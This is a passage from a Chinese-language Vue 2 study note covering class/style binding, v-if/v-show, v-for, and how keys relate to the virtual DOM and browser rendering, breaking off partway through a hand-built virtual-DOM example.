    <span class="nc">.atguigu3</span><span class="p">{</span>
        <span class="nl">border-radius</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"basic"</span> <span class="na">:class=</span><span class="s">"classArr"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">classArr</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">atguigu1</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">atguigu2</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">atguigu3</span><span class="dl">'</span><span class="p">]</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>对象写法</strong></p><p>对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
    <span class="nc">.atguigu1</span><span class="p">{</span>
        <span class="nl">background-color</span><span class="p">:</span> <span class="no">yellowgreen</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nc">.atguigu2</span><span class="p">{</span>
        <span class="nl">font-size</span><span class="p">:</span> <span class="m">30px</span><span class="p">;</span>
        <span class="nl">text-shadow</span><span class="p">:</span><span class="m">2px</span> <span class="m">2px</span> <span class="m">10px</span> <span class="no">red</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"basic"</span> <span class="na">:class=</span><span class="s">"classObj"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">classObj</span><span class="p">:{</span>
                <span class="na">atguigu1</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
                <span class="na">atguigu2</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
			<span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="style样式"><strong>style样式</strong></h3><p>有两种写法，对象写法，数组写法</p><p><strong>对象写法</strong></p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 绑定style样式--对象写法 --&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"basic"</span> <span class="na">:style=</span><span class="s">"styleObj"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">styleObj</span><span class="p">:{</span>
                <span class="na">fontSize</span><span class="p">:</span> <span class="dl">'</span><span class="s1">40px</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">color</span><span class="p">:</span><span class="dl">'</span><span class="s1">red</span><span class="dl">'</span><span class="p">,</span>
			<span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>数组写法</strong></p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 绑定style样式--数组写法 --&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"basic"</span> <span class="na">:style=</span><span class="s">"styleArr"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">styleArr</span><span class="p">:[</span>
                <span class="p">{</span>
                    <span class="na">fontSize</span><span class="p">:</span> <span class="dl">'</span><span class="s1">40px</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">color</span><span class="p">:</span><span class="dl">'</span><span class="s1">blue</span><span class="dl">'</span><span class="p">,</span>
                <span class="p">},</span>
                <span class="p">{</span>
                    <span class="na">backgroundColor</span><span class="p">:</span><span class="dl">'</span><span class="s1">gray</span><span class="dl">'</span>
                <span class="p">}</span>
            <span class="p">]</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="112-条件渲染">1.12 条件渲染</h2><h3 id="v-if">v-if</h3><ul><li><p>写法：</p><p>(1).v-if=”表达式”</p><p>(2).v-else-if=”表达式”</p><p>(3).v-else=”表达式”</p></li><li><p>适用于：切换频率较低的场景</p></li><li><p>特点：不展示的DOM元素直接被移除</p></li><li><p>注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”</p></li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 使用v-if做条件渲染 --&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-if=</span><span class="s">"false"</span><span class="nt">&gt;</span>欢迎来到<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-if=</span><span class="s">"1 === 1"</span><span class="nt">&gt;</span>欢迎来到<span class="nt">&lt;/h2&gt;</span>
    
    
    <span class="c">&lt;!-- v-else和v-else-if --&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-if=</span><span class="s">"n === 1"</span><span class="nt">&gt;</span>Angular<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-else-if=</span><span class="s">"n === 2"</span><span class="nt">&gt;</span>React<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-else-if=</span><span class="s">"n === 3"</span><span class="nt">&gt;</span>Vue<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-else</span><span class="nt">&gt;</span>哈哈<span class="nt">&lt;/div&gt;</span>
    
    
    <span class="c">&lt;!-- v-if与template的配合使用 --&gt;</span>
    <span class="c">&lt;!-- 就不需要写好多个判断，写一个就行 --&gt;</span>
    <span class="c">&lt;!-- 这里的思想就像事件代理的使用 --&gt;</span>
    <span class="nt">&lt;</span><span class="k">template</span> <span class="na">v-if=</span><span class="s">"n === 1"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h2&gt;</span>你好<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;h2&gt;</span>尚硅谷<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;h2&gt;</span>北京<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;/</span><span class="k">template</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">styleArr</span><span class="p">:[</span>
                <span class="p">{</span>
                    <span class="na">fontSize</span><span class="p">:</span> <span class="dl">'</span><span class="s1">40px</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">color</span><span class="p">:</span><span class="dl">'</span><span class="s1">blue</span><span class="dl">'</span><span class="p">,</span>
                <span class="p">},</span>
                <span class="p">{</span>
                    <span class="na">backgroundColor</span><span class="p">:</span><span class="dl">'</span><span class="s1">gray</span><span class="dl">'</span>
                <span class="p">}</span>
            <span class="p">]</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="v-show"><strong>v-show</strong></h3><ul><li>写法：v-show=”表达式”</li><li>适用于：切换频率较高的场景</li><li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)</li></ul><blockquote><p>备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到</p><p>v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 使用v-show做条件渲染 --&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-show=</span><span class="s">"false"</span><span class="nt">&gt;</span>欢迎来到<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-show=</span><span class="s">"1 === 1"</span><span class="nt">&gt;</span>欢迎来到<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div><h2 id="113-列表渲染">1.13 列表渲染</h2><h3 id="v-for指令">v-for指令</h3><ul><li>用于展示列表数据</li><li>语法：v-for=”(item, index) in xxx” :key=”yyy”</li><li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 遍历数组 --&gt;</span>
    <span class="nt">&lt;h2&gt;</span>人员列表（遍历数组）<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(p,index) of persons"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            -
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>

    <span class="c">&lt;!-- 遍历对象 --&gt;</span>
    <span class="nt">&lt;h2&gt;</span>汽车信息（遍历对象）<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(value,k) of car"</span> <span class="na">:key=</span><span class="s">"k"</span><span class="nt">&gt;</span>
            -
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>

    <span class="c">&lt;!-- 遍历字符串 --&gt;</span>
    <span class="nt">&lt;h2&gt;</span>测试遍历字符串（用得少）<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(char,index) of str"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            -
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>

    <span class="c">&lt;!-- 遍历指定次数 --&gt;</span>
    <span class="nt">&lt;h2&gt;</span>测试遍历指定次数（用得少）<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(number,index) of 5"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            -
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
			<span class="na">persons</span><span class="p">:</span> <span class="p">[</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">001</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">18</span> <span class="p">},</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">002</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">李四</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">19</span> <span class="p">},</span>
				<span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">003</span><span class="dl">'</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">王五</span><span class="dl">'</span><span class="p">,</span> <span class="na">age</span><span class="p">:</span> <span class="mi">20</span> <span class="p">}</span>
			<span class="p">],</span>
			<span class="na">car</span><span class="p">:</span> <span class="p">{</span>
				<span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">奥迪A8</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">price</span><span class="p">:</span> <span class="dl">'</span><span class="s1">70万</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">color</span><span class="p">:</span> <span class="dl">'</span><span class="s1">黑色</span><span class="dl">'</span>
			<span class="p">},</span>
			<span class="na">str</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span>
		<span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h3 id="key的原理"><strong>key的原理</strong></h3><p>vue中的key有什么作用？（key的内部原理）</p><p>了解vue中key的原理需要一些前置知识。</p><p>就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。</p><p>虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。</p><p>而key有啥用？</p><p>key是虚拟dom的标识。</p><p>先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM</p><h4 id="真实dom和其解析流程">真实<code class="language-plaintext highlighter-rouge">DOM</code>和其解析流程</h4><p>这里参考超级英雄大佬：https://juejin.cn/post/6844903895467032589</p><p><code class="language-plaintext highlighter-rouge">webkit</code> 渲染引擎工作流程图</p><table><tbody><tr><td>![img](https://upload-images.jianshu.io/upload_images/4345378-b7ccad3bc808783f.png?imageMogr2/auto-orient/strip</td><td>imageView2/2/w/624/format/webp)</td></tr></tbody></table><blockquote><p>中文版</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/cd1757feee540ef20c50b81af16d75ca.png" alt="img" /></p><p>所有的浏览器渲染引擎工作流程大致分为5步：创建 <code class="language-plaintext highlighter-rouge">DOM</code> 树 —&gt; 创建 <code class="language-plaintext highlighter-rouge">Style Rules</code> -&gt; 构建 <code class="language-plaintext highlighter-rouge">Render</code> 树 —&gt; 布局 <code class="language-plaintext highlighter-rouge">Layout</code> -—&gt; 绘制 <code class="language-plaintext highlighter-rouge">Painting</code>。</p><ul><li><p>第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。</p></li><li><p>第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；</p></li><li><p>渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：</p><ul><li><p>css优先：引入顺序上，css资源先于js资源</p></li><li><p>js后置：js代码放在底部，且js应尽量少影响DOM构建</p><blockquote><p>还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {…}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠</p></blockquote></li></ul></li><li><p>第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。</p></li><li><p>第四步，<strong>渲染布局</strong>：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。</p></li><li><p>第五步，<strong>渲染树绘制</strong>：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p></li></ul><p><strong>注意点：</strong></p><p><strong>1、<code class="language-plaintext highlighter-rouge">DOM</code> 树的构建是文档加载完成开始的？</strong> 构建 <code class="language-plaintext highlighter-rouge">DOM</code> 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 <code class="language-plaintext highlighter-rouge">HTML</code> 文档解析完成之后才开始构建 <code class="language-plaintext highlighter-rouge">render</code> 树和布局。</p><p><strong>2、<code class="language-plaintext highlighter-rouge">Render</code> 树是 <code class="language-plaintext highlighter-rouge">DOM</code> 树和 <code class="language-plaintext highlighter-rouge">CSS</code> 样式表构建完毕后才开始构建的？</strong> 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。</p><p><strong>3、<code class="language-plaintext highlighter-rouge">CSS</code> 的解析注意点？</strong> <code class="language-plaintext highlighter-rouge">CSS</code> 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。</p><p><strong>4、<code class="language-plaintext highlighter-rouge">JS</code> 操作真实 <code class="language-plaintext highlighter-rouge">DOM</code> 的代价？</strong>传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实<code class="language-plaintext highlighter-rouge">DOM</code>的性能特别差，我们可以来演示一遍。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">app</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="c1">// 获取 DIV 元素</span>
    <span class="kd">let</span> <span class="nx">box</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#app</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">box</span><span class="p">);</span>

    <span class="c1">// 真实 DOM 操作</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">box</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>

    <span class="c1">// 虚拟 DOM 操作</span>
    <span class="kd">let</span> <span class="nx">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">num</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">box</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">num</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">);</span>

<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322180402052.png" alt="image-20220322180402052" /></p><blockquote><p>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。</p></blockquote><h4 id="虚拟-dom-的好处"><strong>虚拟 DOM 的好处</strong></h4><p>​ 虚拟 <code class="language-plaintext highlighter-rouge">DOM</code> 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 <code class="language-plaintext highlighter-rouge">DOM</code> 的动作，虚拟 <code class="language-plaintext highlighter-rouge">DOM</code> 不会立即操作 <code class="language-plaintext highlighter-rouge">DOM</code>，而是将这 10 次更新的 <code class="language-plaintext highlighter-rouge">diff</code> 内容保存到本地一个 <code class="language-plaintext highlighter-rouge">JS</code> 对象中，最终将这个 <code class="language-plaintext highlighter-rouge">JS</code> 对象一次性 <code class="language-plaintext highlighter-rouge">attach</code> 到 <code class="language-plaintext highlighter-rouge">DOM</code> 树上，再进行后续操作，避免大量无谓的计算量。所以，用 <code class="language-plaintext highlighter-rouge">JS</code> 对象模拟 <code class="language-plaintext highlighter-rouge">DOM</code> 节点的好处是，页面的更新可以先全部反映在 <code class="language-plaintext highlighter-rouge">JS</code> 对象(虚拟 <code class="language-plaintext highlighter-rouge">DOM</code> )上，操作内存中的 <code class="language-plaintext highlighter-rouge">JS</code> 对象的速度显然要更快，等更新完成后，再将最终的 <code class="language-plaintext highlighter-rouge">JS</code> 对象映射成真实的 <code class="language-plaintext highlighter-rouge">DOM</code>，交由浏览器去绘制。</p><p>​ 虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。</p><p>​ 回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 <code class="language-plaintext highlighter-rouge">tag</code>、<code class="language-plaintext highlighter-rouge">props</code>、<code class="language-plaintext highlighter-rouge">children</code> 三个属性。</p><blockquote><p>接下来我们手动实现下 虚拟 DOM。</p><p>分两种实现方式：</p><p>一种原生 js DOM 操作实现；</p><p>另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）</p></blockquote><p><strong>算法实现</strong></p><p><strong>（1）</strong>用 JS 对象模拟 DOM 树：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">virtual-dom</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Virtual</span> <span class="nx">DOM</span><span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">ul</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">list</span><span class="dl">"</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">li</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">item</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">1</span><span class="o">&lt;</span><span class="sr">/li</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">li</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">item</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">2</span><span class="o">&lt;</span><span class="sr">/li</span><span class="err">&gt;
</span>      <span class="o">&lt;</span><span class="nx">li</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">item</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Item</span> <span class="mi">3</span><span class="o">&lt;</span><span class="sr">/li</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="sr">/ul</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">World</span><span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/div&gt;</span><span class="err"> 
</span></code></pre></div></div><p>我们用 <code class="language-plaintext highlighter-rouge">JavaScript</code> 对象来表示 <code class="language-plaintext highlighter-rouge">DOM</code> 节点，使用对象的属性记录节点的类型、属性、子节点等。</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * Element virdual-dom 对象定义
 * @param {String} tagName - dom 元素名称
 * @param {Object} props - dom 属性
 * @param {Array&lt;Element|String&gt;} - 子节点
 */</span>
<span class="kd">function</span> <span class="nx">Element</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">=</span> <span class="nx">tagName</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">props</span> <span class="o">=</span> <span class="nx">props</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">=</span> <span class="nx">children</span><span class="p">;</span>
    <span class="c1">// dom 元素的 key 值，用作唯一标识符</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">props</span><span class="p">.</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">key</span> <span class="o">=</span> <span class="nx">props</span><span class="p">.</span><span class="nx">key</span>
    <span class="p">}</span>
<span class="p">}</span>
